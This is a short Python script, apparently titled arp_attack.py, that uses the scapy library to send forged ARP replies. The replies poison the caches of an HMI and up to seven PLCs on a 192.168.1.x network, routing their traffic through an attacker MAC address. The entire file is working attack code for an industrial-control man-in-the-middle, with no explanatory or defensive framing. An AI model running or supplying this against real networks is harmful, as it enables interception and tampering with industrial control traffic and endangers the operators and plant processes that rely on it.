import sys
from scapy.all import *

table = [
    {
        'ip': '192.168.1.10',
        'mac': '00:1D:9C:C7:B0:10'
    },
    {
        'ip': '192.168.1.20',
        'mac': '00:1D:9C:C8:BC:20'
    },
    {
        'ip': '192.168.1.30',
        'mac': '00:1D:9C:C8:BD:30'
    },
    {
        'ip': '192.168.1.40',
        'mac': '00:1D:9C:C7:FA:40'
    },
    {
        'ip': '192.168.1.50',
        'mac': '00:1D:9C:C8:BC:50'
    },
    {
        'ip': '192.168.1.60',
        'mac': '00:1D:9C:C7:FA:60'
    },
    {
        'ip': '192.168.1.70',
        'mac': '00:1D:9C:C8:BC:70'
    },
    {
        'ip': '192.168.1.77',
        'mac': 'AA:AA:AA:AA:AA:AA'
    }
]

if len(sys.argv) != 2:
    print("Usage: sudo python3 arp_attack.py <number_of_targets>")
    sys.exit(1)

try:
    n = int(sys.argv[1])
except ValueError:
    print("Please enter a valid number.")
    sys.exit(1)

for i in range(min(n, len(table))):
    t = table[i]
    E = Ether(dst = '00:1D:9C:C8:BC:70', src = 'AA:AA:AA:AA:AA:AA')  
    A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = t["ip"], hwdst = '00:1D:9C:C8:BC:70', pdst = '192.168.1.70')  
        
    print(f"send a packet to hmi")
    pkt = E/A  
    sendp(pkt)

        
    E1 = Ether(dst = t["mac"], src = 'AA:AA:AA:AA:AA:AA')  
    A1 = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.70', hwdst = t["mac"], pdst = t["ip"])  
        
    pkt1 = E1/A1 
    print(f"send a packet to plc{i+1}")
    sendp(pkt1)